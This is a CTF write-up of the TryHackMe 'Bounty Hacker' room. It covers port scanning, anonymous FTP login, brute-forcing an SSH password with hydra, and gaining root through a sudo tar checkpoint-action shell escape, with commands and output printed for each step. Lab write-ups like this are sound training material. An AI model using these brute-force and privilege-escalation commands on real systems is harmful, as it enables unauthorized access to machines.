---
title: "Writeup - THM - BountyHacker"
description: "Walkthrough of Bounty Hacker of TryHackMe"
ate: 2020-09-24 23:14:00 +0100 
author: Fr3akazo1d!
categories: [Hacking, CTF]
tags: [Linux, tar, privesc, security]
image: /assets/img/thm-images/THM-BountyHacker.png
---

# Global Information

| Room           | Date           | Difficulty | Tags                               | Time |
| -------------- | -------------- | ---------- | ---------------------------------- | ---- |
| Bounty Hacker  | 24.09.2020     |   Easy     | Linux, tar, privesc, security      | 4h   |

# Used Programs

| Program  | Command |
| --------- | -------- |
| rustscan | rustscan $ip --ulimit 5000 -- -sC -sV -oN nmap/initial  tee output |
| namp     |  nmap -sC -sV -oN FTP-Scan -p 21 10.10.149.155 |
| hydra | hydra -t 16 -l l** -P locks.txt 10.10.149.155 ssh | 
| ssh  | ssh l**@10.10.149.155 |
| tar | sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh |

# Steps:

## 1 Check for open Ports

This is a beginner flagged Room. So i give it a try. It only takes 30min to get the root flag. 

First i started with a rustscan of the Machine. To check witch ports are open on the machine. 
Below the rustscan output. 

---

```sh
rustscan 10.10.149.155 --ulimit 5000 -- -sC -sV -oN nmap/initial | tee output                                
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/pmalle/.config/rustscan/config.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 

Open 10.10.149.155:22
Open 10.10.149.155:21
Open 10.10.149.155:80
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 22,21,80 10.10.149.155

Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-23 20:27 CEST
Initiating Ping Scan at 20:27
Scanning 10.10.149.155 [2 ports]
Completed Ping Scan at 20:27, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:27
Completed Parallel DNS resolution of 1 host. at 20:27, 0.06s elapsed
DNS resolution of 1 IPs took 0.06s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 20:27
Scanning 10.10.149.155 [3 ports]
Discovered open port 22/tcp on 10.10.149.155
Discovered open port 80/tcp on 10.10.149.155
Discovered open port 21/tcp on 10.10.149.155
Completed Connect Scan at 20:27, 0.06s elapsed (3 total ports)
Nmap scan report for 10.10.149.155
Host is up, received syn-ack (0.061s latency).
Scanned at 2020-09-23 20:27:36 CEST for 0s

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```

---

We see three ports open on the target. (21 FTP, 22 SSH, 80 http)

## 2 Check Web-Site

The first thing i was doing was to check the Web-Site. Was looking for the robots.txt file but the file was missing on the target. 
The Website looks normal and nothing interessting was on the site. 

## 3 Check with Gobuster 

I also started a gobuster search for the Website, if some hidden files are on the Server. 
But the only folder gobuster was finding was Images. 

## 4 Enumerate FTP-Server

Next step is to check the FTP server. For this i have started a nmap scan to check if it is possible to login anonymous. 

---

```sh
nmap -sC -sV -oN FTP-Scan -p 21 10.10.149.155        
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-23 20:28 CEST
Nmap scan report for 10.10.149.155
Host is up (0.060s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.3.139
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.58 seconds
```

---
And bingo, Anonymous login is availalbe on the machine. 
Let's login with Anonymous to the client and check what i can find on it. 
```sh
ftp 10.10.149.155
Connected to 10.10.149.155.
220 (vsFTPd 3.0.3)
Name (10.10.149.155:pmalle): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07 21:41 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07 21:47 task.txt
226 Directory send OK.
```

I downloaded this files from the FTP-Server to my Client. 

```sh
ftp> get locks.txt
ftp> get task.txt
```

Locks.txt is a file with a lot of Names in there. Looks like a directory.
Task.txt is a file where some task are descripted and it contains a username. 

As a hint from TryHackMe, we can Bruteforce ssh with the locks.txt file and the username. 

## 5 Bruteforce ssh

So lets fire up hydra and brutefoce the login to ssh:
```sh
hydra -t 16 -l l** -P locks.txt 10.10.149.155 ssh
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-23 20:31:43
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.149.155:22/
[22][ssh] host: 10.10.149.155   login: l**   password: R****************3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-23 20:31:48
```

Now we have a username and a login for ssh:

- Username: l**
- Password: R****************3

## 6 login with ssh 

Now lets get on the Machine with ssh:
```sh
ssh l**@10.10.149.155
``` 

On the User Desktop we found the user.txt file, whitch gave us the User-Flag, i used "cat" to display the content of the file. 

- User-flag: THM{C*************3}

## 7 Priv-Escalation
 
The last step is to get the Root-Flag. 

For this step i have tried different ways. 
First step was, to check if i can run any commands with sudo. but the "sudo -l" command was protected with password. 
so i thought, ok, i don't have the password for the user. I will go for LinPeas to check if any other tings are good for Priv Escalation. 

Uploaded Linpeas and run it. But Linpeas give me no Information about any possibilitys. 

I was searching on the box for some Priv-Escalation things i can use. 

Then i was thinking about the "sudo -l" command. I tried it with the password from the ssh-login. And this password was valid. 

```sh
sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

Password is working, and the output shows me, that i can run "tar" as sudo user without password. 

Perfect lets check GTFOBins for Priv-Escalation. 

Found the way: 
```sh
sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
/bin/tar: Removing leading `/' from member names
# id
uid=0(root) gid=0(root) groups=0(root)
```

Wohoo, i am root. 
Last step is to cat the root file, this was located in "/root/root.txt" 
```sh
# cat root.txt
THM{8***********r}
```

# Conclusion

This Box was nothing new to me. Only thing with the command "sudo -l" and the password. But thanks it came to my mind that i have a password for the user. Other wise it would be really frustrated. 
